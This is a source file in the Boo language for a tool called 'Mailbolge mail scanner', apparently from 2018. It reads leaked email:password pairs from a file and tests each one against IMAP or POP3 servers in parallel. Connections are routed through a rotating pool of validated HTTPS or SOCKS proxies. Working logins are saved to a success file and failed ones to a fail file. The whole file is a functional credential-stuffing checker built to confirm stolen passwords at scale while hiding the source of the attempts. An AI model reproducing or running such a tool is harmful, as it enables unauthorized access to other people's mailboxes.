import System
import System.IO
import System.Net
import System.Threading
import System.Reflection
import System.Net.Sockets
import System.Threading.Tasks
import System.Linq.Enumerable
import System.Collections.Generic
import System.Text.RegularExpressions
import System.Runtime.CompilerServices
import MailKit.Net.Pop3 from 'lib/Mailkit'
import MailKit.Net.Imap from 'lib/Mailkit'
import MailKit.Security from 'lib/Mailkit'
import Org.Mentalis.Network.ProxySocket from "lib/ProxySocket.dll"

#.{ [Classes]
class CUI:
	static final channels = {"fail": "Red", "success": "Cyan", "note": "DarkGray", "io": "Yellow",
		"fault": "DarkRed", "meta": "Green"}
	static final control = char('•')

	def constructor():
		dbg("")
		log("""# =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= #
			# Mailbolge mail scanner v0.02      #
			# Developed in 2018 by V.A. Guevara #
			# =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= #
			""".Replace('\t', ''), "meta")

	# --Methods goes here.
	def log(info, channel as string):
		lock Console:
			for chunk in "$info".Split(control):
				Console.ForegroundColor = Enum.Parse(ConsoleColor, channels[channel])
				Console.Write(chunk)
			Console.WriteLine()
			Console.ForegroundColor = ConsoleColor.Gray

	def dbg(info):
		Console.Title = "◢.Mailbolge$info.◣"
# -------------------- #
class DiskReport:
	final pref		= ""
	final succfile 	= null
	final failfile	= null
	final channels	= {}

	def constructor(title as string):
		pref				= IO.Path.GetFileName(title)
		succfile, failfile	= (File.CreateText(req("$f.txt")) for f in ('success', 'fail'))
		channels			= {"success": succfile, "fail": failfile}

	def echo(info, channel as string):
		out = channels[channel] as StreamWriter
		out.WriteLine(text = "$info")
		out.Flush()
		return text

	def req(fname as string):
		return "$pref~$fname"
# -------------------- #		
class Box:
	public final server		= ""
	public final user	 	= ""
	public final password	= ""
	private final cancel	= CancellationTokenSource().Token
	private client as duck
	public proxy as Proxy
	event done as EventHandler of string

	# --Methods goes here.
	def constructor(server_ as string, user_ as string, password_ as string):
		server, user, password = server_.ToLower(), user_, password_

	def connect(use_imap as bool):
		# Connection preparations.
		client	= (ImapClient	if use_imap else Pop3Client)()
		port	= (993			if use_imap else 995)
		host	= ("imap"		if use_imap else "pop") + ".$(server.reroute())"
		sock	= proxy.socket	if proxy
		# Actual connection.
		try:
			if sock:
					sock.Connect(host, port)
					client.Connect(sock, host, port, SecureSocketOptions.Auto, cancel)
			else:	client.Connect(host, port, SecureSocketOptions.Auto, cancel)
			return client
		except ex:
			client.Dispose()
			sock.Dispose() if sock

	def probe():
		try: 
			service.Authenticate(email, password, cancel)
			done(self, "open")
		except ex:
			if ex.Message.StartsWith("Please log in via your web browser"): done(self, 'auth')
			else: done(self, 'fail')
		return self

	def probe_async():
		Task.Run({probe()})
		return self

	[Extension] static def reroute(server as string):
		if server in ["lenta.ru"]: return "rambler.ru"
		return server

	override def ToString():
		return "$email:$password"

	email:
		get: return "$user@$server"

	service:
		get:
			unless client:
				unless client = connect(true): client = connect(false)
			return client

	def destructor():
		client.Dispose() if client
# -------------------- #
class Proxy:
	public final ip as IPAddress
	public final port		= 0
	public final user		= ""
	public final password	= ""
	public final type as ProxyTypes

	# --Methods goes here.
	def constructor(url as Uri):
		ip		= Dns.GetHostEntry(url.Host).AddressList[0]
		port 	= url.Port
		if url.UserInfo: user, password = url.UserInfo.Split(char(':'))
		for t in (ProxyTypes.Https, ProxyTypes.Socks4, ProxyTypes.Socks5):
			return if type = t and test()
		type = ProxyTypes.None

	def test():
		return Box("mail.ru", "I am", "Error", proxy: self).connect(false)

	override def ToString():
		return "proxy://$ip:$port"

	socket:
		get:
			sock = ProxySocket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
			sock.ProxyEndPoint = IPEndPoint(ip, port)
			sock.ProxyUser = user
			sock.ProxyPass = password
			sock.ProxyType = type
			return sock
# -------------------- #
class Mailbolge:
	final tasks			= Dictionary[of Box, DateTime]()
	final log			= {info, channel|info = ':I am Error:'; return self}
	final dbg			= {info|info = ':I am Error:'; return self}
	final proxlist		= List[of Proxy]()
	final reporter		= void
	final max_tension	= 124
	private preload		= 0
	private debugger	as Timer

	# --Methods goes here.
	def constructor(ui as duck, storage as Type):
		log	= {info, channel|ui.log(info, channel); return self}
		dbg	= {info|ui.dbg(info); return self}
		reporter = storage

	def check(box as Box, dest as duck):
		if box.proxy = proxlist.get_next():	log("Launching check through •$(box.proxy)• for •$(box)•", 'note')
		else: log("Launching check for •$(box)•", 'note')
		box.probe_async().done += checker(dest)		
		lock tasks: tasks.Add(box, DateTime.Now)

	def checker(dest as duck):
		return def (box as Box, result as string):
			lock tasks:
				return self unless tasks.Remove(box)
			if result == "fail":
				log("Unable to access •$(box.email)• with password •$(box.password)•", 'fail')
				dest.echo(box, 'fail')
			else:
				log("Password for •$(box.email)• confirmed: •$(box.password)•", 'success')
				dest.echo(box, "success")

	def proxy_checker(entry as string):
		url	= Uri((entry if entry.Contains("://") else "proxy://$entry"))
		return def():
			try:
				if (proxy = Proxy(url)).type:
					log("├> Succesfully registered •$(url)•", 'success').proxlist.Add(proxy)
					return self
			except: pass
			log("├* Unable to connect through •$(url)•", 'fail')
			preload++ 


	[Extension] static def to_box(entry as string):
		if Regex.Matches(entry, ":").Count == 1:
			box, password = entry.Split(char(':'))
			if Regex.Matches(box, "@").Count == 1:
				user, server = box.Split(char('@'))
				return Box(server, user, password)

	[Extension] static def get_next[of T](list as List[of T]):
		if list.Count:
			list.Add(entry = list[0])
			list.RemoveAt(0)
			return entry

	tension:
		get: return tasks.Count

	proxies:
		set:
			proxy_tasks = List[of Task]()
			progress	= 0
			using debugger = Timer({dbg("::$(Math.Round(preload*100.0/proxy_tasks.Count, 1))%")}, null, 0, 200):
				try:
					log("┌Registering proxies from '•$(value)•':", 'io')					
					for entry in File.ReadLines(value):
						try: proxy_tasks.Add(Task.Run(proxy_checker(entry)))
						except ex: log("│Invalid URL provided: •$(entry)•", 'fault')
					Task.WaitAll(proxy_tasks.ToArray(), 60 * 1000 * 20)
					log("└•$(proxlist.Count)• proxies was added to list.\n", 'io')
				except ex: log("└$ex", 'fault')

	feed:
		set:
			using debugger = Timer({dbg(" [$tension/$max_tension]")}, null, 0, 200):
				try:
					log("Parsing '•$(value)•'...", 'io')
					feeder	= File.ReadLines(value).GetEnumerator()
					dest	= reporter(value)
					while true:
						if tension < max_tension and feeder.MoveNext():
							if box = feeder.Current.to_box(): check(box, dest)
							else: log("Invalid entry encountered: •$(feeder.Current)•", 'fault')
						elif tension == 0: break
				except ex: log(ex, 'fault')
#.}

# ==Main code==
def Main(argv as (string)):
	AppDomain.CurrentDomain.AssemblyResolve += def(sender, e):
		return Assembly.LoadFrom("lib/$(AssemblyName(e.Name).Name).dll")
	Mailbolge(CUI(), DiskReport, proxies: "proxy.lst", feed: (argv[0] if argv.Length else 'feed.txt'))
	Threading.Thread.Sleep(3000)